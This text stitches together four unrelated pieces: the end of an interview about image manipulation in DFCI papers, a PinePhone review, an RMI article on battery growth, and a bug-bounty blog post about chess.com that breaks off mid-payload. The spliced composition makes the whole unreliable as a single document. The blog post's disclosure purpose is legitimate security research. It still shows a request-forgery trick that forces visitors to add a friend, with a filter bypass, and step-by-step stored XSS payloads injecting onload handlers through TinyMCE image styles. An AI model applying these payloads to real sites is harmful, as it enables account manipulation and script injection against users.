href="https://forbetterscience.com/2023/11/17/schneider-shorts-17-11-2023-this-brilliant-scientist-has-been-punished-enough/#plos" data-track="click" data-label="https://forbetterscience.com/2023/11/17/schneider-shorts-17-11-2023-this-brilliant-scientist-has-been-punished-enough/#plos" data-track-category="body text link"><i>PLoS One</i> retracted nine papers</a>, and these were all to do with gastric-damage stuff. In that case, I was looking for image reuse between papers. I went and I got all of this guy’s papers, and I cropped all of the images out of all the papers, put it in a giant folder and then resized them all. And I used a script to feed it into Imagetwin [<a href="https://www.nature.com/articles/d41586-023-02920-y" data-track="click" data-label="https://www.nature.com/articles/d41586-023-02920-y" data-track-category="body text link">software that compares images</a> with a database of more than 25 million others]. But for the DFCI stuff, a lot of what I found and what had been previously posted [on PubPeer] is duplicated images within the same paper. Imagetwin is really useful for these things.</p><p>I note and collect the errors on PubPeer, write a blog, send the blog to the publisher and university. What I’m hoping for is that the authors respond on PubPeer. If I see a really credible, active response on PubPeer, then I’d probably just leave it there.</p><h2>Thinking about the DFCI papers, what pattern of potential image manipulation stood out to you the most?</h2><p>There is one where there’s images of mice, and it looks like one of them has been copied lots of times, and there’s a bioluminescent signal that’s been superimposed on top. It’s got the ears in the same place. It’s almost certainly the same mouse in about five different pictures in different groups and different time points. In [another paper], you’ve got a western-blot figure, and the same band has appeared multiple times across the whole lot. Not just one splice or one clumsy copy and paste; it’s the same band that has been superimposed into that block quite carefully.</p><figure>

</figure><h2>What did you think of the DFCI’s acknowledgement that it would seek retractions for 6 papers and corrections for 31 others?</h2><p>I’ve flagged about 58 papers. In 16 or 17 of those, they say the data was collected at other institutions. Three of them, they dispute. I accept that. But I’d like to know what the dispute is. [The DFCI did not respond to explain why it disagrees with the anomalies flagged by David. It also said that one further paper is still under examination.]</p><p>So that seems like it’s pretty much all of them accounted for. In one sense, I’m relieved. They basically accepted that these are all errors. I stand by what’s on the blog and by what I post on PubPeer.</p><p>It does leave a frustrated feeling because a lot of these comments have been on PubPeer for ages. But now, suddenly, after the blogpost, Rollins has said, ‘we’ve known about some of these concerns’. Why does it take some nobody like me dropping a blog to make them start doing this? [Berlin didn’t immediately respond to questions on when the DFCI’s investigation began or how many papers the institute was investigating before David published his blogpost.]</p><h2>Do you think journals are doing enough to correct the scientific record when these cases come up?</h2><p>The response is usually slow, if they respond at all. It’s a very painful process to try to report an accusation of image duplication. It’d be nice if there was an obvious way just to click a button and flag a paper. It would be nice if you could leave a comment on the journal’s page, because how many people read PubPeer?</p><h2>How can scientists avoid accusations of data impropriety?</h2><p>There’s a pretty simple way to preventing all of this: you should design some file-organizing system that involves giving research images a sensible name. And then when it comes to checking your paper before you publish it, you need to trace back all the images to the raw data and check them against the metadata. For example, if you have a photo labelled as ‘Day three’, does that correspond to the date the photo was taken or that the experiment happened on?</p><h2>Do you have any recommendations for scientists whose work is questioned?</h2><p>I don’t want to make an environment where people feel harassed. The main thing I’d like to see is a polite response, and to acknowledge whether the error is there or not. Because it’s very frustrating if you say, ‘We’ll look into this,’ without acknowledging the errors on the page or giving a timeline.</p>

<h2>PinePhone - Post daily driver review</h2>
<p>Review of PinePhone after a month of daily driving.</p>

<p>All opinions are my own, and most of the review is for my own use-cases. There are some comparisons, mostly for entertainment purposes, to iOS (based on my previous device, iPhone 12 Pro) and Android (based on my current device, de-googled OnePlus Nord N10 5G). </p>
<br>
<h2>Verdict</h2>
<p>PinePhone is a great mobile Linux device. I would use it as my daily driver, and probably iron out some issues I ran into, but for me, it failed at... being a phone. I had repeated, unpredictable problems both placing and receiving calls, and I could not resolve them. See below for details.</p>
<br>
<h2>Hardware</h2>
<p>3GB RAM Convergence edition original PinePhone rev 1.2B.</p>

<br>
<h3>Body</h3>
<p>TLDR: Plastic, pretty standard for mid level phone.</p>
<p>Well-made, pretty standard dimensions, is a bit slippery, but buttons have a good feel to them. It would be great with a grippy case.</p>
<p>Having all three buttons on the right side makes it convenient for environments like SXMO, which uses buttons for navigating menus.</p>
<br>
<h3>Display</h3>
<p>TLDR: Okay, difficult to see in bright light.</p>
<p>After ultra-smooth modern phone touchscreens, PinePhone's screen protector feels strange, but is nothing unusual. (You can take it off or replace it with a glass one for more glossy feel)</p>
<p>The display itself is an IPS panel. Not as colorful as OLED, but not as expensive or power-hungry, either. My only complaint is that it's difficult to see in bright light, so I kept the light theme for everything.</p>
<br>
<h3>Battery</h3>
<p>TLDR: Eh. Enough for occasional texting and short calls. Plug in otherwise.</p>
<p>Not great, but not terrible. At first, and when traveling, I carried a power bank with me, but rarely needed it. If you use the phone to occasionally text and chat, you are OK. Browser and WiFi are the two things that noticeably drain the battery. Often, if not actively using bandwidth, I think it makes sense to turn WiFi off.</p>
<p>I made an adapter to use with Samsung S20 Ultra battery case, but some strange USB issues kill the modem while case is active, so I could not try it out very well.</p>

<br>
<h2>Software</h2>
<p>postmarketOS stable with Phosh (installed on new 128GB SD card)</p>

<br>
<h3>Installation</h3>
<p>TLDR: EASY.</p>
<p>To install an OS, you flash an image to an SD card, put it in the PinePhone and turn it on. That's it. You can swap OSes by changing SD cards as much as you want.</p>
<p>Compare to Android, which involves unlocking the bootloader, flashing recovery, booting into recovery, flashing an OS image, and possibly patching the image to get root.</p>
<p>Compare to iOS which doesn't let you do that to any reasonable extent.</p>
<p>(Yes, I know normal people do not install OS on their phones...)</p>
<br>
<h3>Activation</h3>
<p>TLDR: No hand-holding, but only few settings.</p>
<p>When you start some distros/desktops, you are presented with a short tutorial. You need to configure the mobile connection yourself, but it's usually just setting the APN and MMSC URLs. For postmarketOS+Phosh, the APN setting is in Settings/Mobile Networks, and MMSC setting is in Chats/Settings.</p>

<p>Compare to Android, which requires clicking through multiple pages of setup. Although most of that is skippable (depending on the manufacturer too, I guess).</p>
<p>Compare to iOS, which not only annoys you to set up Siri and Face ID on setup and at every update, but does not allow you to activate the phone without an SMS message. (Very convenient when in another country with no coverage or high roaming charges)</p>
<br>
<h3>UI</h3>
<p>TLDR: Phosh is conventional and practical. SXMO is a bit unusual but pretty cool and very customizable.</p>
<p>Phosh navigation uses the bar on the bottom of the screen (similar enough to iOS and Android), which opens both a list of running applications and an app drawer. All apps in the drawer are listed alphabetically but can be added to the favorites list on top. </p>

<p>I think this unification of home screen with the app drawer is simpler and faster than Android/iOS pinned apps + pages, and much more organized than iOS's "home screen is an app dumpster" (which i see on many people's phones).</p>
<p>There are occasional slowdowns but they are not significant.</p>
<p>Some unimplemented controls, such as switch for location and inhibit-suspend (aka caffeine), I wrote as desktop entries ("shortcuts" that show up in app drawer).</p>
<p>Most GTK-based apps are more or less consistent in their styling, and you can force a theme on everything if you want to. Qt is a bit all over the place.</p>
<p>Phosh does not have a global "back" button, so each application has to implement its own UI. Usually, the back button is in the upper left, which is very inconvenient. Although, new Android and iOS now use the "swipe from left edge" to go back, which is equally unwieldy for people with regular-length thumbs. Android with its back button on the bottom bar is still the best in this regard.</p>
<p>Another desktop environment is SXMO. It has a menu-based UI that you navigate using the volume and power buttons, as well as some pre-defined gestures for other actions. It is intended to be used with simple terminal-based tools, but I had no problems running any other software. I liked being able to open applications side-by-side, override and customize any menu (you can even make app-specific menus for most-used actions, for example), and run hooks on events (such as custom notifications for texts, calls, etc).</p>

<br>
<h3>Keyboard</h3>
<p>TLDR: Simple, but customizable</p>
<p>Phosh uses squeekboard, which is a pretty standard, simple keyboard which supports multiple languages and can be very easily customized by editing a YAML file. There's no swipe, spell-check, or predictive text, but there are other projects that try to implement that.</p>
<p>SXMO uses wvkbd, which is aimed more towards terminal use and includes cursor keys, modifiers (Ctrl, Alt), and other useful keys (/, -, Tab). To customize wvkbd, you... compile it from source. It's pretty straightforward C and builds in a few seconds.</p>
<br>
<h3>Notifications</h3>
<p>TLDR: Only calls and SMS notifications are truly real-time.</p>
<p>If PinePhone is in sleep (by default, after 2 minutes of idle on Phosh), it cannot receive notifications. The modem (which, itself, is another Linux device) is always on, so once it receives a call or SMS, it will wake PinePhone up. Theoretically, it should be possible to have modem check for notifications, but I am not aware of any project that did this yet. </p>
<p>The way notifications present themselves is per-application, more or less. On Phosh, Calls vibrate continuously for calls, Chats vibrates and chimes. Fractal (Matrix messenger), and Dino (XMPP messenger), however, produce notifications silently. But you have access to their source code, so that can be changed - I rebuilt Dino with noisy notifications before.</p>
<p>There are no icons on the status bar, but most notifications show in the pull-down panel and make the LED blink blue. Yes, I love blinkenlights. However, blinking the LED is kind of silly, because if the phone goes to sleep, it will keep the LED state it last had (either permanently on or off).</p>
<p>Compare with Android, which mostly got rid of the notification light :( But notifications are shown in the status bar and can wake the screen.</p>
<p>Compare with iOS, whose UI is terrible in this regard. Notifications wake the screen, and show on lockscreen, but only until you unlock the phone. Then they are dropped somewhere into "notification center", which required an additional swipe to open. And unless you start a habit of checking that separate screen, you can miss them for a long time. The status bar is taken up by the notch, so there is no space for icons there. </p>
<br>
<h3>Phone calls</h3>
<p>TLDR: Probably fine for 2G and 3G calls, but VoLTE is flaky and unpredictable.</p>
<p>Your experience may vary wildly. According to forums, github, and reddit:</p>
<ul>
<li>Some people report no issues placing and receiving calls with PinePhone as-is.</li>
<li>Some even use it exclusively as a phone, no other software.</li>
<li>Some install and use the FOSS modem firmware, and it resolves their issues.</li>
<li>Some people report that FOSS modem firmware causes more issues, and recommend reverting to stock 01.003 or 01.002 version for stability.</li>
</ul>

<p>For me, calls were extremely unreliable. Just for the information, I have T-Mobile as my provider (which is one of the few that allow PinePhone in the US), but I live in a hilly neighborhood of a small city where my signal strength shows 50% at best for 4G, and 25% for 2G. 3G has been disabled and 2G significantly scaled down by all US carriers AFAIK. Because of that, I have to rely on VoLTE for calls. Which, I believe, is the main cause of my problems. As far as I know, PinePhone's modem, Quectel EG25-G, is intended for IoT devices, and technically supports VoLTE, but not officially.</p>

<p>These are the issues I had:</p>
<ul>
<li>Modem crashes for no apparent reason. Takes about 30 seconds to restart. Somewhat better with FOSS firmware though.</li>
<li>Phone shows 4G connectivity, but modem will reboot or stop responding when trying to call or use data. Seems to happen after long periods of sleep.</li>
<li>Unable to place a call. Phone either drops the call immediately, or waits about 30 seconds and then drops it. Presumably, the delay is an attempt to place a call over 2G, which, due to poor signal, does not happen. Sometimes, keeping the phone awake for a few minutes seems to reconnect it to VoLTE, and allows me to call. Sometimes not, and once, I have been unable to call for up to 30 minutes.</li>
<li>Unable to receive a call. Callers say their call goes straight to voicemail, or rings once and then is sent to voicemail. I get absolutely no indication of missed calls. Usually happens after the phone has been in sleep for some length of time. One way to improve the chances of receving a call is to keep the phone plugged in and awake. My suspicion is that a sleeping modem cannot accept VoLTE calls, and if a call cannot come in through 2G, it is dropped.</li>
<li>Rarely, call drops in the middle of the call, then either one of the above issues happens. Usually, once call is connected, it is fine.</li>
<li>Phone gets uncomfortably hot at the top, where the earpiece (and, i suppose, the antenna) is.</li>
</ul>

<p>I tried several firmwares, and they all had their benefits and drawbacks, but the VoLTE problems above persisted for all of them:</p>
<ul>
<li>Biktorgj's FOSS firmware 0.7.4, ADSP 01.003 and others. Lots of cool features (tracking, alarm-via-modem), lower power consumption, automatic checking for stuck SMS messages, modem seems to crash less. However, did not seem to connect to 2G properly, no voice / echo correction (I sound super quiet on the call, and cannot use speakerphone), and no automatic GPS switch (have to run a sudo script to enable it). All incoming calls went to voicemail.</li>
<li>Stock firmware 30.006, latest. Had voice / echo correction and automatic GPS, but incoming calls still go to voicemail. Crashes more than FOSS though.</li>
<li>Stock firmware 01.002, sort-of-original, and recommended for stability. Has voice / echo correction, automatic GPS, and correctly downgrades to 2G when placing calls. Some incoming calls came through.</li>
</ul>


<p>Some people on the forum recommended modifying udev rules to keep the power to permanently on for stock firmware (it is set to "auto" by default), but that did not seem to help, just increased the battery drain.</p>

<p>Out of curiosity, I tried Mobian OS, which uses a different kernel with some modem-related improvements. One noticeable change is a very strong mic boost that sounds like rumbling or cat purr to the other part. I suppose this is to address the "too quiet" issue for FOSS firmware? At that point, I did not want to try re-installing firmware again.</p>
<p>On that note, UBPorts does not support VoLTE on ANY of their devices.</p>

<p>To eliminate another potential cause, I got a new SIM card. I didn't think it would matter, but my friend suggested to do it anyway, as he had to get a new SIM card to get 3G working on his phone (many years ago). That didn't help.</p>

<p>Interestingly enough, while I was writing this, calling using my current (officially supported by T-Mobile) Android phone, I got a very similar scenario: about 30 seconds of attempting to call, phone frantically switching between VoLTE and VoWiFi, then dropping the call. The second attempt went through 2G and connected. Maybe I should not blame PinePhone's modem here...</p>
<br>
<h3>Voicemail</h3>
<p>TLDR: You get cryptic texts.</p>
<p>When you get a voicemail, you get a data text message from a short number, so you will know you got one. There is VVMD (visual voicemail daemon), but I did not try setting it up.</p>
<br>
<h3>Texting</h3>
<p>TLDR: Works well.</p>
<p>Basic text messaging through SMS and media through MMS work well and without issues. </p>
<p>The default (and only?) text messenger, Chats, does not natively play some formats (for example, 3gp video), but they will open as long as you have the appropriate application.</p>
<p>I really have no complaints here because I remember when getting MMS and unblocking the SMS queue on the modem were manual operations.</p>
<p>On PinePhone, text messages will wake up the phone, so they are almost realtime, as one would expect.</p>
<br>
<h3>Messaging</h3>
<p>TLDR: Works well, no notifications in sleep.</p>
<p>Although Chats lets you use Matrix accounts and even supports encryption messaging, there are several usability issues, resulting in disconnections, missed messages, and crashes. </p>
<p>For Matrix, Fractal (via flatpak) works very well, although has some minor UI issues. Nheko works well, seems a bit faster, and has swipe controls (if that's your thing).</p>
<p>For XMPP, I have used Dino in the past, and it is also a very well-made messenger, with audio and video call functionality (which I have not tried).</p>
<p>I do not have any contacts on Signal, so I have not tried any Signal clients or bridges.</p>
<p>For WhatsApp, I run a Matrix bridge, so 99% of messages are routed through my Matrix client. For once-in-a-while calls, I use an old device I keep at home.</p>
<br>
<h3>Camera</h3>
<p>TLDR: Potato, no video out of the box.</p>
<p>Camera works okay. Raw camera data has to be post-processed to balance colors, so it takes several seconds for a photo to appear in a directory. Sometimes, post-processing fails and you get a black rectangle. Editing some shell-scripts, I removed the heavy part of post-processing (sharpening) and reduced the processing time to around a second.</p>
<p>The quality is poor by any standard since 2010: the pictures are grainy and have low dynamic range. At the same time, they look like old film photos, and there's a certain charm to it.</p>
<p><img src="https://yaky.dev/2024-01-25-pinephone-post-daily-driver-review/pinephone-photo.jpg" alt=""></p>
<p>Do not let the phone go to sleep with the camera app open, or it might enter a state where it cannot wake up and needs to be rebooted.</p>
<p>There are no apps to shoot video, but it's possible via scripts (I have not tried).</p>
<p>While having a bad camera can be frustrating, think about all the pictures you took and never looked at again.</p>
<br>
<h3>Navigation</h3>
<p>TLDR: Works. Not Google Maps though, learn your local roads.</p>
<p>Osmin is a good navigation app with live directions, voice, and offline maps.</p>
<p>GNOME Maps 45 and later has decent mobile UI, but does not have offline capabilities AFAIK.</p>
<p>As is with many apps based on OpenStreetMap data, do not expect that you'll be able to find an address (at least in the US) in Osmin, so use POIs or intersections instead. I think the only app that supports address lookup is Pure Maps, but it was fairly slow for me.</p>
<p>PinePhone's GNSS/GPS module works through the modem. Which sort of makes sense, but then, you can't use GPS without a SIM card installed... When GPS is enabled, it takes 10-15 minutes to get a precise location. Before that, your location is derived from Mozilla Location Service, map of known WiFi spots and their approximate locations, so it can be VERY rough (precision of a few streets away for me). GPS module does support AGPS (assisted GPS, locations of satellites downloaded over the internet) for faster location detection, but AFAIK none of the OSes implement that. (In fact, the modem has the config for it, and should be able to download it itself).</p>
<p>Interestingly, on my degoogled Android, I get a similar experience - very rough location until ~10 minutes later. Makes you consider how much Google knows everyone's router's location.</p>
<br>
<h3>Music</h3>
<p>TLDR: Spotify playback is spotty.</p>
<p>I listen to mostly Spotify, and there is a mobile Linux client called Spot (both postmarketOS/Alpine repos and Flatpak). The main issue with it is that the playback stops after 2-4 songs. Not sure if that is an application issue, or the classic "sound on Linux" issue.</p>
<p>Of course, there's an official Spotify client, but it is available only for desktop Linux (x86_64).</p>
<p>There is spotify-qt, which did not work for me, and spotify-tui for the terminal(!), which I did not try.</p>
<br>
<h3>Browser</h3>
<p>TLDR: Stick with Firefox ESR.</p>
<p>Firefox ESR is the default on many Linux distributions. It is a desktop browser, adapted for mobile. Although it takes a while to load, the browsing is fast. There are some UI issues, and it can feel clumsy to use sometimes, but you should be able to do everything a desktop browser can. And it includes uBlock Origin add-on by default!</p>
<p>GNOME Web has great UI, some adblocking, and Firefox account integration (!), but the renderer itself (based on WebKit) is just too slow.</p>
<p>Angelfish has a nice UI and seems relatively fast, but I haven't used it much to have an opinion.</p>
<p>Another interesting option is BadWolf, WebKit-based browser with toggles for JS and images. Great idea, but I couldn't use it because it cannot focus on a textbox on the page (e.g. search box)</p>
<p>And for the terminal, there is the good old Lynx and w3m.</p>
<p>For gemini, Geopard looks and works really well.</p>
<br>
<h3>Notes</h3>
<p>TLDR: Several options.</p>
<p>I used gedit instead of the newer Text Editor to keep notes, as I found the UI better (fewer steps to do things). There are several note-taking apps, but they are too slow and have too many features that I don't need.</p>
<br>
<h3>Android applications</h3>
<p>TLDR: Possible.</p>
<p>To run Android applications, postmarketOS supports waydroid, which was surprisingly easy and straightforward to install. Launching LineageOS takes about a minute, and running apps drains the battery much quicker, but I was able to install and use a few things from F-Droid and Aurora Store. Expect apps to complain about Google Play Services.</p>
<br>
<h3>Connecting to PC</h3>
<p>TLDR: UNLIMITED POWER!</p>
<p>The "killer feature" of PinePhone is that you can SSH into it as any other Linux machine. If you run SXMO, you can easily navigate the same menus and text/message through the terminal.</p>
<p>I wrote a small rsync script to backup/sync notes and pictures onto my laptop. It does not require Syncthing (saves PinePhone's limited resources) or any complicated setup.</p>
<p>On Android, I sync my notes and pictures using Syncthing, which requires some setup, but is very convenient too.</p>
<p>On iOS, photos are not considered files (WTF Apple?!), so they cannot be synced with Mobius (Syncthing-like app). So the only way to back them up is via USB (which requires additional setup on Linux). </p>
<br>
<h2>Conclusion</h2>
<p>My daily adventures with PinePhone have reached their end. PinePhone is refreshingly straightforward, and practical for many of my daily tasks. Alas, it was not much of a phone. Perhaps PinePDA would be a more fitting name.</p>

					<h3>The Rise of Batteries in Six Charts and Not Too Many Numbers</h3>
					<h6>The unstoppable rise of batteries is leading to a domino effect that puts half of global fossil fuel demand at risk.</h6>
					
											<p>Battery demand is growing exponentially, driven by a domino effect of adoption that cascades from country to country and from sector to sector. This battery domino effect is set to enable the rapid phaseout of half of global fossil fuel demand and be instrumental in abating transport and power emissions. This is the conclusion of RMI’s recently published report <em><a href="https://rmi.org/insight/x-change-batteries/">X-Change: Batteries</a></em>. In this article, we highlight six of the key messages from the report.</p>
<h5>1. Battery sales are growing exponentially up S-curves</h5>
<p>Battery sales are growing exponentially up classic <a href="https://rmi.org/insight/harnessing-the-power-of-s-curves/">S-curves</a> that characterize the growth of disruptive new technologies. For thirty years, sales have been doubling every two to three years, enjoying a 33 percent average growth rate. In the past decade, as electric cars have taken off, it has been closer to 40 percent.</p>
<p><strong>Exhibit 1: Global battery sales by sector, GWh/y</strong></p>

<small>Source: Ziegler and Trancik (2021), Placke et al. (2017) for 1991-2014; <i>BNEF Long-Term Electric Vehicle Outlook</i> (2023) for 2015-2022 and the latest outlook for 2023 (*) from the BNEF Lithium-Ion Battery Price Survey (2023).</small></p>
<h5>2. Battery costs keep falling while quality rises</h5>
<p>As volumes increased, battery costs plummeted and energy density — a key metric of a battery’s quality — rose steadily. Over the past 30 years, battery costs have fallen by a dramatic 99 percent; meanwhile, the density of top-tier cells has risen fivefold. As is the case for many modular technologies, the more batteries we deploy, the cheaper they get, which in turn fuels more deployment. For every doubling of deployment, battery costs have fallen by 19 percent. Couple these cost declines with density gains of 7 percent for every deployment doubling and batteries are the fastest-improving clean energy technology.</p>

<h5>3. Creating a battery domino effect</h5>
<p>As battery costs fall and energy density improves, one application after another opens up. We call this the battery domino effect: the act of one market going battery-electric brings the scale and technological improvements to tip the next. Battery technology first tipped in consumer electronics, then two- and three-wheelers and cars. Now trucks and battery storage are set to follow. By 2030, batteries will likely be taking market share in shipping and aviation too.</p>

<h5>4. Incumbent modelers remain behind the curve</h5>
<p>How fast will batteries continue to grow and improve? The answer is a lot faster than today’s consensus view. When it comes to the growth of small modular technologies, there are two rules of thumb: the first is that superior technologies undergoing rapid cost decline tend to grow exponentially; the second is that most analysts miss the first. Batteries have been no exception to this rule, having been consistently underestimated by modelers.</p>
<p>Over the past years, many battery forecasts have effectively projected linear growth. As Exhibit 4 illustrates, actual sales keep outrunning such forecasts and as a result analysts keep revising their projections upward. The caution of such linear thinking may, on the surface, seem reasonable, but in reality, it is simply wrong.</p>

<h5>5. The drivers of change will strengthen</h5>
<p>If we look forward to the next seven years, we see the drivers of change strengthening. Notably, we see costs continuing to fall, policy support continuing to rise, and competition between economic blocs continuing to drive a race to the top. And while there are barriers to battery adoption on the horizon, humanity’s wit, will, and capital are scaling proportionally faster. Thus, we do not see a scenario of slow adoption as credible; instead, we model two futures: fast or faster. Reality is likely to lie somewhere between the two.</p>
<p>RMI forecasts that in 2030, top-tier density will be between 600 and 800 Wh/kg, costs will fall to $32–$54 per kWh, and battery sales will rise to between 5.5–8 TWh per year. To get a sense of this speed of change, the lower-bound (or the “fast” scenario) is running in line with BNEF’s Net Zero scenario. The faster S-curve scenario exceeds it.</p>

<h5>6. Enabling the phase-out of fossil fuels</h5>
<p>The best strategy to rapidly phase out fossil fuels is to accelerate the deployment of technologies that reduce fossil fuel <em>demand</em>. Batteries are on the path to displace 86 exajoules (EJ) of fossil fuels from road transport (emitting 6 GtCO<sub>2 </sub>per year) and to put at risk another 23 EJ (or 1.6 GtCO<sub>2</sub>/y) from shipping and aviation. In the electricity sector, as batteries synchronize the natural rhythms of the sun and the wind with the timing of electricity demand, they help enable the reduction of a further 175 EJ of fossil fuel demand (or almost 15 GtCO<sub>2</sub>/y).</p>

<p>Batteries are growing fast, but that’s no reason to rest on our laurels. Continued growth will require continued effort. Batteries got this far through tireless, concerted efforts of companies, governments, researchers, and climate advocates. And whether the motivation is lower prices, geopolitical advantage, or climate, it is essential to make this fast transition faster.</p>

<div id="readability-page-1" class="page"><section>
				<p>Playing Chess is one of the many hobbies I like to do in my spare time, apart from tinkering around with technology. However, I'm not very good at it, and after losing many games, I decided to see if I could do something I'm much better at; hacking the system!</p><p>This blog post is about how I used my cybersecurity knowledge to find XSS on the #1 chess site on the internet, with a user base of over <strong>100 million</strong> members - <a href="https://chess.com/?ref=skii.dev" rel="noreferrer">Chess.com</a>. But first, a bit of preface (that includes a slightly less serious, although amusing, OSRF vulnerability!)</p><hr><p>In early 2023, I started playing a lot on chess.com; during a discussion with a friend on Discord, I persuaded them to also sign up to the site and used a feature offered by <code>chess.com</code> to become friends once they signed up immediately. </p><figure><img src="https://skii.dev/content/images/2024/01/Untitled.png" alt="" loading="lazy" width="460" height="174"></figure><p>This feature reminded me of the <a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever?ref=skii.dev" rel="noreferrer">MySpace worm</a> in ~2005 (heck, I wasn't even alive then!) when Samy Kamkar injected some code into his profile that would friend anyone who visited it and then inject the same code into their profile (hence creating the worm). I wondered if it would be possible to do something similar here. I clicked on the link and created a new account, then checked the dev tools network tab - interestingly, <strong>after</strong> the account had been made, it sent a GET request to <code>htttps://chesss.com/registration-invite?hash=XXX</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-1.png" alt="" loading="lazy" width="543" height="653"></figure><p>This meant that if I could get a user to request this URL, it would force them to friend me automatically. Coincidentally, I was also messing with my settings when I came across the holy grail.....a TinyMCE rich text editor with an image upload function! </p><figure><img src="https://skii.dev/content/images/2024/01/image-3.png" alt="" loading="lazy" width="753" height="559" srcset="https://skii.dev/content/images/size/w600/2024/01/image-3.png 600w, https://skii.dev/content/images/2024/01/image-3.png 753w"></figure><p>Let's see what happens when I insert a <a href="https://i.imgur.com/0PmEjVm.png?ref=skii.dev" rel="noreferrer">link</a> for the image. Is the URL embedded directly, or will there be some safe handling to protect against request forgeries? </p><figure><img src="https://skii.dev/content/images/2024/01/image-11.png" alt="" loading="lazy" width="1430" height="521" srcset="https://skii.dev/content/images/size/w600/2024/01/image-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-11.png 1000w, https://skii.dev/content/images/2024/01/image-11.png 1430w" sizes="(min-width: 1200px) 1200px"></figure><p>Chess.com handles this server-side by re-uploading the image to their content hosting server and then pointing the image URL to that. Hmmm...<em>But</em> what about using a link whose root domain is <code>chess.com</code>? Would that still get re-uploaded? This would be important, especially when chained with a specific URL like...</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-1.png" alt="" loading="lazy" width="460" height="263"></figure><figure><img src="https://skii.dev/content/images/2024/01/image-12.png" alt="" loading="lazy" width="753" height="100" srcset="https://skii.dev/content/images/size/w600/2024/01/image-12.png 600w, https://skii.dev/content/images/2024/01/image-12.png 753w"></figure><p><strong>BINGO!</strong> I switched to my alt account, navigated to my main account's profile and then checked my alt's friend list - it had successfully added my main account. </p><figure><img src="https://skii.dev/content/images/2024/01/image-7.png" alt="" loading="lazy" width="771" height="313" srcset="https://skii.dev/content/images/size/w600/2024/01/image-7.png 600w, https://skii.dev/content/images/2024/01/image-7.png 771w" sizes="(min-width: 720px) 720px"></figure><p>I genuinely couldn't believe this had worked, and I had quite a chuckle about it. During the bug-bounty report &amp; triage, the developers tried to implement a block because when I tried to reproduce it again for them, it came up with the following error message:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-2.png" alt="" loading="lazy" width="246" height="116"></figure><p>No problem at all, though; I managed to bypass it again by setting up a subdomain that included <code>chess.com</code> &amp; redirected it to <code>/registration-invite</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-8.png" alt="" loading="lazy" width="892" height="399" srcset="https://skii.dev/content/images/size/w600/2024/01/image-8.png 600w, https://skii.dev/content/images/2024/01/image-8.png 892w"></figure><p>And here's what it looked like when visiting my profile:</p><figure><img src="https://skii.dev/content/images/2024/01/image-13.png" alt="" loading="lazy" width="1436" height="373" srcset="https://skii.dev/content/images/size/w600/2024/01/image-13.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-13.png 1000w, https://skii.dev/content/images/2024/01/image-13.png 1436w" sizes="(min-width: 1200px) 1200px"></figure><p>After finding and reporting this bug, I was very interested in what else I could achieve by abusing TinyMCE - could I get XSS? How good was the sanitisation? That brings us to the exciting part of the blog post...</p><hr><p>After playing around with the editor for a bit, I realised I wouldn't get very far without using something like <a href="https://portswigger.net/burp?ref=skii.dev" rel="noreferrer">Burp's proxy</a> to intercept the request to save my <code>About</code> description and inject raw HTML code directly (Anything written in the editor was treated as text). Of course, as one would expect, there were already preventions to remove any non-whitelisted attributes and tags - so let's look at what <em>is</em> allowed. </p><p>Viewing the TinyMCE config on the site (you can find this in the <code>tinymce-lazy-client.js</code> file), for <code>img</code> tags the <code>background-image</code> style attribute is in the <code>Allow</code> list and does not get filtered out. This was a long shot, but I wondered if the function to re-upload any external URL for the image also got applied to the attributes. Well...no harm in trying; let's see what happens using the following payload:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://test.com/);"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-3.png" alt="" loading="lazy" width="1556" height="322" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-3.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-3.png 1000w, https://skii.dev/content/images/2024/01/Untitled-3.png 1556w" sizes="(min-width: 1200px) 1200px"></figure><p> I actually couldn't believe my eyes when I loaded up my profile. It had indeed conveyed the URL, and somewhere along this process, something had gone terribly wrong, resulting in a <code>"</code> being appended to the beginning of the new link. This resulted in the style attribute being closed prematurely, causing the URL to be converted into extra attributes! </p><p>Because adding unfiltered attributes was possible, I tried to figure out how I could generate a payload that the server would manipulate into running malicious javascript on image load. It seemed that in the URL, <code>/</code> was being used as a delimiter, with each element between it being added as a new attribute. So I tried with <code>url('https://test.com/onload') </code></p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-4.png" alt="" loading="lazy" width="540" height="119"></figure><p>To figure out how to add a payload, I tried fuzzing through all the symbols and seeing how each changed the final result. Through this tactic, I worked out you could add a <code>?</code> to modify the subsequent attribute data (although this comes with the slight caveat that you wouldn't be able to use the <code>?</code> symbol in the rest of the payload). Using the following:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=alert);"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-5.png" alt="" loading="lazy" width="640" height="99" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-5.png 600w, https://skii.dev/content/images/2024/01/Untitled-5.png 640w"></figure><p>Now we have another issue: the final <code>&amp;quot;&amp;quot;</code> at the end will throw a syntax error every time, preventing code from running...let's use <code>//</code> to comment that out and test a basic <code>alert(1)</code></p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url('https://images.chesscomfiles.com/?/onload=alert(1);//');"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-7.png" alt="" loading="lazy" width="441" height="112"></figure><p>Damn, brackets are filtered….this means that I wouldn’t be able to call any functions with any parameters.</p><p>Even worse, practically every useful symbol is filtered – <code>,’ ^&amp;[]’$%</code> ...so how are we supposed to get any serious impact? Back to basics - Let’s see if we can set a variable, <code>x</code>, to <code>4</code>. (Luckily, the <code>=</code> symbol isn't filtered out.)</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 